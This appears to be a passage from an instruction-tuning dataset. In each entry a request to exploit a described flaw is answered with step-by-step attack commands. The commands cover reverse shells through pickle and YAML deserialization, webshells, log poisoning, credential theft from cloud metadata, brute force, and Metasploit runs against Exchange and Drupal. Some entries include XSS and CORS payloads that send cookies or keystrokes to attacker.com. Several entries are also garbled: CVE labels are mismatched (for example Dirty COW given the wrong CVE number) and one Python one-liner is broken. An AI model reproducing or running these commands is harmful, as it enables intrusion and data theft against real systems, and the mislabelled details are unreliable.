    "output": "Step 1️⃣ — Identify Vulnerability\nWeak CAPTCHA fails to prevent bots, allowing mass account creation for spam/abuse.\n\nStep 2️⃣ — Automate Bypass\nScript to parse CAPTCHA from response, solve, and submit.\n\nStep 3️⃣ — Execute Attack\nUse curl in loop:\n```bash\n#!/bin/bash\nfor i in {1..100}; do\n    captcha=$(curl -s 'https://site.com/register' | grep -oP 'What is \\K[0-9]+\\s*\\+\\s*[0-9]+')\n    answer=$(echo $captcha | bc)\n    curl -X POST https://site.com/register -d \"username=bot$i&pass=pass&captcha=$answer\"\ndone\n```"
  },
  {
    "instruction": "Provide the steps and command to exploit the exposed .git directory for source code theft.",
    "input": "Dir scan: .git/HEAD exposed at http://dev.site.com/.git/HEAD, full repo retrievable via git tools.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed .git allows downloading entire source code, including secrets and logic.\n\nStep 2️⃣ — Download Repo\nUse git-dumper or manual curl to fetch objects and reconstruct.\n\nStep 3️⃣ — Execute Attack\n```bash\ngit-dumper http://dev.site.com/.git/ stolen_repo\n# Or manual: cd /tmp; mkdir repo; cd repo; curl http://dev.site.com/.git/HEAD | cut -d' ' -f2 > ref; git init; git remote add origin http://dev.site.com/.git; git fetch\n```"
  },
  {
    "instruction": "Generate a two-step chain using the broken authentication to reset any user's password.",
    "input": "Finding 1: Password reset at /reset?token=abc requires email but no rate limit. Finding 2: Token valid for 24h without user verification.",
    "output": "Step 1️⃣ — Trigger Reset for Target\nRequest reset for admin@company.com, capture the token from email or link.\n\nStep 2️⃣ — Chain to Takeover\nUse the token to set new password without owning the email.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Step 1: curl 'https://app.com/reset?email=admin@company.com'  # Get token from response/link\n# Step 2: curl -X POST 'https://app.com/reset?token=<TOKEN>' -d 'new_pass=attacker123'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the outdated PHP version for local RCE via upload.",
    "input": "Server enum: PHP 5.3.5 on /var/www, unrestricted upload to /uploads/ allows .php execution.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nOutdated PHP with upload flaw allows webshell deployment for persistent access.\n\nStep 2️⃣ — Upload Webshell\nTransfer a PHP shell to uploads and access via browser.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Create shell.php: echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php\nscp shell.php user@target:/var/www/uploads/\n# Access: curl 'http://target/uploads/shell.php?cmd=id'\n```"
  },
  {
    "instruction": "Generate the steps and curl command to exploit the OAuth 2.0 misconfiguration for unauthorized token access.",
    "input": "Finding: OAuth provider at https://auth.company.com/token uses implicit flow with state parameter ignored, allowing token interception via open redirect.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMisconfigured OAuth implicit flow exposes access tokens in URL fragments, stealable via redirects without state validation.\n\nStep 2️⃣ — Craft Redirect Payload\nSet redirect_uri to attacker-controlled site to capture the token from the callback URL.\n\nStep 3️⃣ — Execute Attack\nPhish user with crafted auth link; intercept at redirect. Example curl to simulate:\n```bash\ncurl 'https://auth.company.com/authorize?response_type=token&client_id=app&redirect_uri=https://evil.com/capture&scope=admin' -v\n# At evil.com, extract #access_token= from URL and use: curl -H 'Authorization: Bearer <TOKEN>' https://api.company.com/admin\n```"
  },
  {
    "instruction": "Provide the Python command to exploit Python pickle deserialization for RCE.",
    "input": "Burp finding on https://pyapp.com/process: Accepts pickled objects in POST, using pickle.loads() without validation, leading to code execution.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe pickle deserialization allows injecting malicious objects that execute code on load.\n\nStep 2️⃣ — Generate Malicious Pickle\nUse a gadget like __reduce__ to call os.system for reverse shell.\n\nStep 3️⃣ — Execute Attack\nCreate and send payload. Listener: `nc -lvnp 8888`.\n```python\npython3 -c 'import pickle, os; class R(cmd): def __reduce__(self): return (os.system, (\"nc -e /bin/sh <YOUR_IP> 8888\",)); pickle.dump(R(), open(\"payload.pkl\", \"wb\"))'\ncurl -X POST --data-binary @payload.pkl -H 'Content-Type: application/octet-stream' https://pyapp.com/process\n```"
  },
  {
    "instruction": "Generate a two-step chain using LFI to RCE via log poisoning.",
    "input": "Finding 1: LFI in /page.php?file=about.txt allows ../../ inclusion. Finding 2: Apache access log at /var/log/apache2/access.log includes user input via User-Agent.",
    "output": "Step 1️⃣ — Poison Log File\nInject PHP code into User-Agent header, which gets logged, making the log a webshell.\n\nStep 2️⃣ — Include and Execute\nUse LFI to include the poisoned log and trigger the code.\n\nStep 3️⃣ — Execute Attack\nFirst poison:\n```bash\ncurl -A '<?php system($_GET[\"c\"]); ?>' http://target.com/\n```\nThen execute:\n```bash\ncurl 'http://target.com/page.php?file=../../../../var/log/apache2/access.log%c' -d 'c=id'\n```"
  },
  {
    "instruction": "Provide the Hydra command to brute-force the weak password policy on SSH.",
    "input": "Enum: SSH on 192.168.1.200 port 22, users 'admin' and 'user', password policy allows common words, no lockout.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak policy enables online brute-force without account lockouts.\n\nStep 2️⃣ — Formulate Hydra Attack\nUse Hydra with wordlist for multiple users in parallel.\n\nStep 3️⃣ — Execute Attack\n```bash\nhydra -L users.txt -P rockyou.txt ssh://192.168.1.200 -t 4 -vV\n```"
  },
  {
    "instruction": "Generate the curl command to exploit the exposed debug endpoint for sensitive info leak.",
    "input": "Dirbuster finding: /debug/info at https://app.com/debug/info returns server version, env vars, and DB creds in JSON.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed debug endpoints leak internal configs, aiding further attacks.\n\nStep 2️⃣ — Fetch and Parse Data\nDirectly request the endpoint to extract credentials.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl https://app.com/debug/info | jq '.db_password'\n# Use leaked creds for lateral movement\n```"
  },
  {
    "instruction": "Provide the commands to exploit command injection in Docker run arguments.",
    "input": "API finding: Docker container creation at http://dockerhost.com/api/run?image=alpine&cmd=ls, injects 'cmd' unsafely into docker run.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnescaped cmd param allows injection of additional Docker commands or shell meta-chars.\n\nStep 2️⃣ — Craft Injection\nAppend ; to run extra commands like whoami.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://dockerhost.com/api/run?image=alpine&cmd=ls;id'\n# For escape: cmd=ls;docker run -v /:/host -it alpine chroot /host sh\n```"
  },
  {
    "instruction": "Generate the jwt_tool command to bypass JWT validation using none algorithm.",
    "input": "JWT analysis: Token at Authorization header uses alg: none, server accepts unsigned tokens.",
    "output": "Step 1️⃣ — Identify Vulnerability\n'none' algorithm allows forging tokens without signature verification.\n\nStep 2️⃣ — Forge Token\nRemove signature and set alg to none, modify claims.\n\nStep 3️⃣ — Execute Attack\nUse jwt_tool for tampering.\n```bash\npython3 jwt_tool.py <YOUR_TOKEN> -T -m none -p '{\"user\":\"admin\"}'\n# Use new token: curl -H 'Authorization: Bearer <FORGED>' https://app.com/admin\n```"
  },
  {
    "instruction": "Provide the curl command to exploit prototype pollution in Node.js app for property override.",
    "input": "Finding: Node app at https://jsapp.com/update merges user input into global prototype, polluting Object.prototype.isAdmin = true.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPrototype pollution overwrites global properties, bypassing auth checks.\n\nStep 2️⃣ — Craft Pollution Payload\nSend JSON with __proto__ to set isAdmin on prototype.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://jsapp.com/update -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'\ncurl https://jsapp.com/admin  # Now accesses as admin\n```"
  },
  {
    "instruction": "Generate the command to exploit Ruby YAML deserialization for RCE.",
    "input": "Finding: Rails app at https://rubyapp.com/config accepts YAML params, using YAML.load without safe mode.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe YAML.load deserializes to code execution via gadget chains.\n\nStep 2️⃣ — Create Gadget\nUse a YAML payload triggering system call.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 9999`. Send YAML:\n```bash\ncurl -X POST https://rubyapp.com/config -H 'Content-Type: text/yaml' -d $'--- !ruby/object:Gem::Installer\ni: x\nrubygems_api_key: \"bash -i >& /dev/tcp/<YOUR_IP>/9999 0>&1\"'\n```"
  },
  {
    "instruction": "Provide the ab command to exploit misconfigured Nginx for slowloris-style DoS.",
    "input": "Finding: Nginx 1.14 on http://web.com with keepalive_requests=1000, no rate limiting, vulnerable to slow HTTP DoS.",
    "output": "Step 1️⃣ — Identify Vulnerability\nHigh keepalive and no limits allow resource exhaustion via slow requests.\n\nStep 2️⃣ — Formulate DoS\nUse Apache Benchmark with low concurrency and slow rate to tie up connections.\n\nStep 3️⃣ — Execute Attack\n```bash\nab -n 10000 -c 100 -T 'application/x-www-form-urlencoded' -p postdata.txt http://web.com/\n# Or slowloris.py for true slow attack\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure direct object reference in the file sharing feature.",
    "input": "Finding: File share at https://share.com/download?id=abc123 allows direct access to any file ID without ownership checks, exposing internal docs.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIDOR in file IDs permits unauthorized download of private files by guessing or enumerating IDs.\n\nStep 2️⃣ — Enumerate and Download\nUse a script or manual requests to test sequential IDs for sensitive files.\n\nStep 3️⃣ — Execute Attack\n```bash\nfor id in $(seq 1000 2000); do curl -o file_$id https://share.com/download?id=$id --write-out '%{http_code}\n' --silent --output /dev/null | grep -q '200' && echo \"Found: $id\"; done\ncurl https://share.com/download?id=1500 -o stolen_doc.pdf\n```"
  },
  {
    "instruction": "Provide the steps and curl command to exploit the broken anti-automation measures for account brute-force.",
    "input": "Finding: Login at https://login.com has no CAPTCHA or rate limit, allows 1000 attempts/min per IP, weak password policy.",
    "output": "Step 1️⃣ — Identify Vulnerability\nAbsent automation controls enable efficient brute-force attacks on credentials.\n\nStep 2️⃣ — Formulate Brute-Force\nUse curl with a wordlist, checking for 302 redirect on success.\n\nStep 3️⃣ — Execute Attack\n```bash\nwhile read pass; do curl -c cookies.txt -d 'user=admin&pass=$pass' https://login.com/login | grep -q 'dashboard' && echo \"Success: $pass\" && break; done < passwords.txt\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Drupalgeddon2 vulnerability for RCE.",
    "input": "Scan on https://drupal.site.com: Drupal 7.58 vulnerable to CVE-2018-7600 (Drupalgeddon2), allowing unauth RCE via form API.",
    "output": "Step 1️⃣ — Identify Vulnerability\nDrupalgeddon2 exploits form state manipulation for arbitrary PHP execution.\n\nStep 2️⃣ — Configure Module\nUse the multi/http module with payload for shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/drupal_drupalgeddon2; set RHOSTS drupal.site.com; set RPORT 80; set LHOST <YOUR_IP>; set PAYLOAD php/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the use of a component with known vulnerabilities in the supply chain.",
    "input": "Dependency check: Lodash 4.17.10 in JS app at https://app.com, vulnerable to CVE-2021-23337 prototype pollution leading to DoS.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOutdated lodash allows prototype pollution via deep merge, crashing the app.\n\nStep 2️⃣ — Craft Pollution Payload\nSend a payload to a vulnerable endpoint using _.merge.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://app.com/api/update -H 'Content-Type: application/json' -d '{\"__proto__\":{\"constructor\":{\"prototype\":{\"polluted\":true}}}}'\n# App crashes on next merge\n```"
  },
  {
    "instruction": "Generate the curl command sequence to exploit the security misconfiguration in CORS headers.",
    "input": "Finding: API at https://api.com has Access-Control-Allow-Origin: https://*.evil.com, allowing wildcard subdomains for credential reads.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMisconfigured CORS with wildcard enables malicious subdomains to steal data via JS.\n\nStep 2️⃣ — Set Up Malicious Domain\nRegister evil.com and use fetch from attacker.evil.com.\n\nStep 3️⃣ — Execute Attack\nHost JS on attacker.evil.com:\n```javascript\nfetch('https://api.com/user', {credentials: 'include'}).then(r => r.text()).then(d => { new Image().src = 'http://attacker.com/steal?' + encodeURIComponent(d); });\n```\nPhish to load the script."
  },
  {
    "instruction": "Provide the Python script to exploit the insufficient entropy in random number generation for prediction.",
    "input": "Finding: Session IDs generated using Math.random() in JS, predictable due to low entropy on client-side.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLow-entropy PRNG allows predicting session IDs for hijacking.\n\nStep 2️⃣ — Predict IDs\nScript to generate likely IDs based on timestamp seed.\n\nStep 3️⃣ — Execute Attack\n```python\nimport random, time\nrandom.seed(int(time.time()))  # Mimic client seed\nfor _ in range(100):\n    sid = ''.join([str(random.randint(0,9)) for _ in range(32)])\n    r = requests.get('https://app.com/profile', cookies={'sid': sid})\n    if r.status_code == 200:\n        print(f'Predicted: {sid}')\n        break\n```"
  },
  {
    "instruction": "Generate the command to exploit the improper certificate validation in the mobile app.",
    "input": "Finding: Android app at com.app pintrusts all certs via NetworkSecurityConfig, allowing MITM for data interception.",
    "output": "Step 1️⃣ — Identify Vulnerability\nDisabled cert pinning enables proxy interception of HTTPS traffic.\n\nStep 2️⃣ — Set Up MITM Proxy\nUse mitmproxy with custom CA installed on device.\n\nStep 3️⃣ — Execute Attack\n```bash\nmitmproxy --mode transparent --set confdir=~/.mitmproxy/ -p 8080\n# On device: Set proxy to attacker IP:8080, install CA, run app, capture traffic\n```"
  },
  {
    "instruction": "Provide the steps and curl command to exploit the failure to restrict URL access to authenticated users.",
    "input": "Finding: Admin panel at https://admin.site.com/dashboard accessible without auth, performs sensitive actions like user deletion.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnrestricted admin URLs expose privileged functions to anonymous users.\n\nStep 2️⃣ — Access and Abuse\nDirectly POST to action endpoints without login.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://admin.site.com/dashboard/delete -d 'user_id=admin' -H 'Content-Type: application/x-www-form-urlencoded'\n```"
  },
  {
    "instruction": "Generate a two-step attack chain using XML bomb for XXE DoS.",
    "input": "Finding 1: XXE in /upload at https://xmlapp.com. Finding 2: Parser processes deep recursive entities, leading to billion laughs attack.",
    "output": "Step 1️⃣ — Craft Recursive Entity\nDefine entities that exponentially expand on resolution.\n\nStep 2️⃣ — Chain to Billion Laughs\nEmbed the bomb in the XML payload to exhaust memory.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://xmlapp.com/upload -H 'Content-Type: application/xml' -d $'<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;\">]><lolz>&lol9;</lolz>'\n```"
  },
  {
    "instruction": "Assuming initial shell, provide commands to exploit the hard-coded credentials in source code for lateral movement.",
    "input": "Code review on target: /app/config.py has DB_PASSWORD='supersecret' hardcoded for internal DB at localhost:5432.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nHardcoded creds allow access to other services using the same secrets.\n\nStep 2️⃣ — Extract and Use Creds\nGrep for creds, then connect to DB for further enum.\n\nStep 3️⃣ — Execute Attack\n```bash\ngrep -r 'PASSWORD' /app/\npsql -h localhost -U app_user -d internal_db -W  # Enter 'supersecret'\n# In psql: \\dt  # List tables, SELECT * FROM users;\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the SolarWinds Orion RCE vulnerability.",
    "input": "Scan finding on target 10.10.50.20: SolarWinds Orion 2020.2.6 HF1 vulnerable to CVE-2021-35211, allowing unauth RCE via SNMP trap viewer plugin.",
    "output": "Step 1️⃣ — Identify Vulnerability\nCVE-2021-35211 in SolarWinds enables arbitrary file upload and execution via manipulated SNMP traps.\n\nStep 2️⃣ — Formulate Exploit\nUse the auxiliary module to craft and send a malicious trap leading to webshell deployment.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/windows/http/solarwinds_orion_snmp_trap_rce; set RHOSTS 10.10.50.20; set RPORT 80; set LHOST <YOUR_IP>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the HTTP/2 DoS via CONTINUATION flood.",
    "input": "Finding: Server at https://h2server.com supports HTTP/2, vulnerable to CVE-2019-9511 by flooding CONTINUATION frames without END_STREAM.",
    "output": "Step 1️⃣ — Identify Vulnerability\nHTTP/2 CONTINUATION flood exhausts memory by sending excessive header continuations.\n\nStep 2️⃣ — Craft Flood Payload\nUse h2load or curl with --http2 to send malformed frames.\n\nStep 3️⃣ — Execute Attack\n```bash\nh2load -n 10000 -c 1000 -m 32 https://h2server.com/\n# Or curl equivalent: curl --http2 -H 'X-Test: ' --data 'A' https://h2server.com/ -v\n```"
  },
  {
    "instruction": "Generate the command sequence to exploit the insecure deserialization in PHP unserialize().",
    "input": "Burp finding on https://phpapp.com/session: Uses unserialize() on user-controlled session data, vulnerable to POP chain for RCE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPHP unserialize allows gadget chains for arbitrary code execution.\n\nStep 2️⃣ — Build POP Chain\nUse phpggc to generate a payload with CommonsChain gadget.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 6666`.\n```bash\nphpggc CommonsChain5 system 'touch /tmp/hacked' > payload.ser\ncurl -X POST -b 'PHPSESSID=$(base64 -w0 payload.ser | tr -d \n)' https://phpapp.com/session\n```"
  },
  {
    "instruction": "Provide the steps and command to exploit the missing HTTP security headers for clickjacking.",
    "input": "SecurityHeaders scan: https://site.com lacks X-Frame-Options, allowing framing in iframe for overlay attacks.",
    "output": "Step 1️⃣ — Identify Vulnerability\nNo X-Frame-Options enables clickjacking by framing sensitive actions.\n\nStep 2️⃣ — Craft Overlay PoC\nHTML with iframe over fake button to trick clicks.\n\nStep 3️⃣ — Execute Attack\nHost PoC:\n```html\n<iframe src='https://site.com/transfer' style='opacity:0.3; position:absolute; top:0; left:0; width:100%; height:100%;'></iframe><button onclick='document.querySelector(\"iframe\").contentWindow.document.querySelector(\"form\").submit();'>Click Here</button>\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the PostgreSQL stacked query injection for schema dump.",
    "input": "Finding: Stacked query SQLi in 'order' param at http://shop.com/query?order=id, PostgreSQL backend allows multiple statements.",
    "output": "Step 1️⃣ — Identify Vulnerability\nStacked queries permit executing additional commands like table creation or dumps.\n\nStep 2️⃣ — Formulate sqlmap\nUse --technique=Q for stacked, --schema-dump for structure.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"http://shop.com/query?order=id\" -p order --dbms=postgresql --technique=Q --schema-dump\n```"
  },
  {
    "instruction": "Provide the commands to exploit the exposed AWS metadata service for credential theft.",
    "input": "Cloud enum: Instance metadata at http://169.254.169.254/latest/meta-data/ accessible from compromised EC2, revealing IAM role creds.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed IMDSv1 allows SSRF or direct access to temp credentials.\n\nStep 2️⃣ — Fetch Credentials\nCurl the metadata endpoints sequentially.\n\nStep 3️⃣ — Execute Attack\nFrom instance shell:\n```bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>\n```"
  },
  {
    "instruction": "Generate the curl command to exploit the reflected XSS in search results for cookie theft.",
    "input": "Finding: Reflected XSS in /search?q=<script>alert(1)</script> at https://forum.com/search, no CSP.",
    "output": "Step 1️⃣ — Identify Vulnerability\nReflected XSS executes JS in victim's browser, stealing cookies or keystrokes.\n\nStep 2️⃣ — Craft Payload\nInject script to exfil cookie to attacker server.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://forum.com/search?q=<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>'\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the timing attack on password comparison.",
    "input": "Finding: Login at https://secure.com/login compares passwords with ==, but early return on mismatch, allowing user enum via timing.",
    "output": "Step 1️⃣ — Identify Vulnerability\nConstant-time comparison failure leaks username validity via response time.\n\nStep 2️⃣ — Measure Timing\nScript to send requests and compare durations.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, time\nusers = ['admin', 'user', 'guest']\nfor u in users:\n    start = time.time()\n    requests.post('https://secure.com/login', data={'user': u, 'pass': 'wrong'})\n    duration = time.time() - start\n    if duration > 0.1:\n        print(f'Valid user: {u}')\n```"
  },
  {
    "instruction": "Generate a two-step chain using file upload RCE to priv esc via SUID.",
    "input": "Finding 1: Unrestricted upload at /upload.php allows .php shells. Finding 2: SUID binary /usr/bin/su vulnerable to env injection.",
    "output": "Step 1️⃣ — Upload Shell\nUpload PHP shell and execute commands.\n\nStep 2️⃣ — Chain to Priv Esc\nFrom shell, abuse SUID su with LD_PRELOAD for root.\n\nStep 3️⃣ — Execute Attack\nUpload:\n```bash\ncurl -F 'file=@shell.php' http://target/upload.php\ncurl 'http://target/uploads/shell.php?cmd=echo \"int main(){setuid(0);system(\\\"/bin/sh\\\");}\" | gcc -x c - -o /tmp/su2'\n/tmp/su2\n```"
  },
  {
    "instruction": "Assuming access, provide commands to exploit the unpatched kernel for dirty COW priv esc.",
    "input": "LinEnum: Kernel 4.8.0-39-generic vulnerable to CVE-2017-1000112, copy-on-write flaw for root shell.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nDirty COW allows overwriting read-only memory mappings to escalate privileges.\n\nStep 2️⃣ — Compile and Run Exploit\nDownload PoC, compile, execute.\n\nStep 3️⃣ — Execute Attack\n```bash\nwget https://www.kernel.com/pub/linux/kernel/v4.x-testing/cve-2017-1000112.c\ngcc cve-2017-1000112.c -o cow\n./cow\n# Spawns root shell\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure temporary file creation for data tampering.",
    "input": "Finding: App creates temp files in /tmp with predictable names like temp_session_123.dat, world-readable/writable, used for session state.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPredictable temp files allow overwriting or reading sensitive session data by another user.\n\nStep 2️⃣ — Craft Tamper Attack\nCreate a race or directly overwrite the file before the app reads it.\n\nStep 3️⃣ — Execute Attack\nMonitor for file creation, then overwrite:\n```bash\n# Script to watch and tamper\ninotifywait -m /tmp -e create | while read path action file; do if [[ $file == temp_session_* ]]; then echo 'hijacked_session' > /tmp/$file; fi; done\n# Or manual: echo 'admin_role=true' > /tmp/temp_session_123.dat\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the open proxy configuration for internal network scanning.",
    "input": "Finding: Web app at https://proxyapp.com forwards requests via 'url' param to any host, including internal 10.0.0.0/8.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMisconfigured proxy acts as SSRF, allowing internal port scanning and service enum.\n\nStep 2️⃣ — Formulate Scan\nCraft URLs to internal IPs/ports, observe response codes or times.\n\nStep 3️⃣ — Execute Attack\n```bash\nfor port in {22,80,443,3306}; do curl 'https://proxyapp.com?url=http://10.0.0.1:'$port -w '%{http_code}\n' -s -o /dev/null; done\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Microsoft Exchange ProxyLogon RCE.",
    "input": "Scan on mail.exchange.com: Exchange Server 2016 vulnerable to CVE-2021-26855 (ProxyLogon), allowing unauth RCE via EWS.",
    "output": "Step 1️⃣ — Identify Vulnerability\nProxyLogon chains SSRF and deserialization for remote code execution on Exchange.\n\nStep 2️⃣ — Configure Module\nUse the exploit module with NTLM auth bypass for shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/windows/http/exchange_proxylogon_rce; set RHOSTS mail.exchange.com; set RPORT 443; set SSL true; set LHOST <YOUR_IP>; set PAYLOAD windows/x64/meterpreter/reverse_https; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insufficiently protected credentials in config files.",
    "input": "Post-access: /etc/app.conf readable by low-priv user, contains plaintext API keys for external services.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed config files leak creds for lateral or external compromise.\n\nStep 2️⃣ — Extract and Abuse\nGrep for keys, then use in API calls.\n\nStep 3️⃣ — Execute Attack\n```bash\ngrep -r 'API_KEY' /etc/\n# Example: curl -H 'X-API-Key: leaked_key' https://external.service.com/admin\n```"
  },
  {
    "instruction": "Generate the Python script to exploit the weak hashing algorithm for password cracking.",
    "input": "DB dump: Passwords hashed with MD5 without salt in 'users' table, common patterns.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak MD5 allows rainbow table or brute-force cracking of hashes.\n\nStep 2️⃣ — Crack Hashes\nUse hashcat with wordlist on dumped hashes.\n\nStep 3️⃣ — Execute Attack\nSave hashes as hashes.txt, run:\n```bash\nhashcat -m 0 -a 0 hashes.txt rockyou.txt\n# Or Python equivalent for custom:\nimport hashlib\npwd = 'password123'\nhash = hashlib.md5(pwd.encode()).hexdigest()\nif hash == 'dumped_hash': print('Cracked:', pwd)\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the server-side request forgery in image processing.",
    "input": "Finding: Image resize at https://img.com/resize?url=http://external.com/img.jpg forwards to internal metadata service.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSSRF in URL param allows requesting internal resources, leaking responses.\n\nStep 2️⃣ — Target Internal\nSet url to internal endpoint like http://localhost/admin.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://img.com/resize?url=http://127.0.0.1:8080/admin/config' -v\n```"
  },
  {
    "instruction": "Generate the command sequence to exploit the buffer overflow in the custom binary for shell.",
    "input": "Fuzzing: Binary /usr/bin/app on target crashes with input >1024 bytes, ASLR off, NX on but ROP possible.",
    "output": "Step 1️⃣ — Identify Vulnerability\nStack buffer overflow allows ROP chain to bypass NX for shell.\n\nStep 2️⃣ — Find Offset and Gadgets\nUse gdb/ROPgadget to craft chain calling system('/bin/sh').\n\nStep 3️⃣ — Execute Attack\n```bash\n# Example payload: python3 -c 'print(\"A\"*offset + rop_chain + \"/bin/sh\\x00\")' | ./app\n# ROPgadget --binary app | grep 'system' for gadgets\n```"
  },
  {
    "instruction": "Provide the steps and command to exploit the improper input validation for SQL injection via numeric field.",
    "input": "Finding: Numeric param 'age' in http://health.com/search?age=25 converted to string without casting, allowing '25 OR 1=1'.",
    "output": "Step 1️⃣ — Identify Vulnerability\nType confusion in numeric fields permits classic SQLi payloads.\n\nStep 2️⃣ — Inject Payload\nAppend boolean condition to dump all records.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://health.com/search?age=25 OR 1=1--' | grep -o 'patient.*'\n```"
  },
  {
    "instruction": "Generate a two-step chain using DOM-based XSS to keylogger deployment.",
    "input": "Finding 1: DOM XSS in /profile#section=<script>alert(1)</script>. Finding 2: Profile page loads user scripts from /js/user.js.",
    "output": "Step 1️⃣ — Inject DOM Script\nCraft URL with payload to write keylogger to user.js.\n\nStep 2️⃣ — Chain to Persistence\nReload profile to load and execute the logger.\n\nStep 3️⃣ — Execute Attack\nPhish URL:\n```bash\n# Payload: http://site.com/profile#section=<script>document.write('<script src=\"http://attacker.com/keylog.js\"></script>');</script>\n# keylog.js: document.onkeypress = e => fetch('http://attacker.com/log?key='+e.key);\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the misconfigured sudo for wildcard injection.",
    "input": "Sudo enum: User can sudo 'vim' as root, vulnerable to -c !sh wildcard expansion.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nSudo vim allows shell escape via command-line wildcards.\n\nStep 2️⃣ — Trigger Escape\nUse :! to run shell from vim.\n\nStep 3️⃣ — Execute Attack\n```bash\nsudo vim -c ':!sh'\n# Or wildcard: sudo vim /nonexistent/*  # Expands to sh if in dir with sh\n```"
  },
  {
    "instruction": "Generate the command to exploit the use of hard-coded cryptographic keys for API abuse.",
    "input": "Reverse engineering: Mobile app hardcodes AES key 'deadbeef12345678' in strings.xml for encrypting API requests to https://api.com/data.",
    "output": "Step 1️⃣ — Identify Vulnerability\nHardcoded keys allow decrypting traffic or forging encrypted requests for unauthorized access.\n\nStep 2️⃣ — Extract and Forge\nUse the key to encrypt a malicious payload mimicking admin requests.\n\nStep 3️⃣ — Execute Attack\nPython to encrypt and send:\n```python\nimport requests, base64\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nkey = b'deadbeef12345678'\ndata = b'{\"action\":\"delete_all\"}'\ncipher = AES.new(key, AES.MODE_ECB)\nenc = base64.b64encode(cipher.encrypt(pad(data, 16))).decode()\ncurl_cmd = f'curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"encrypted\\\":\\\"{enc}\"}}\" https://api.com/data'\nprint(curl_cmd)\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the directory listing enabled for source code exposure.",
    "input": "Finding: Web server at http://dev.com/uploads/ lists all files, including .env with DB creds and source .php files.",
    "output": "Step 1️⃣ — Identify Vulnerability\nEnabled directory browsing exposes application source and configs.\n\nStep 2️⃣ — Enumerate and Download\nBrowse the dir and selectively download sensitive files.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl http://dev.com/uploads/ | grep -E '\\.env|\\.php' | xargs -I {} curl http://dev.com/uploads/{} -o {}.downloaded\ncat .env.downloaded | grep DB_PASS\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the TeamViewer remote access RCE.",
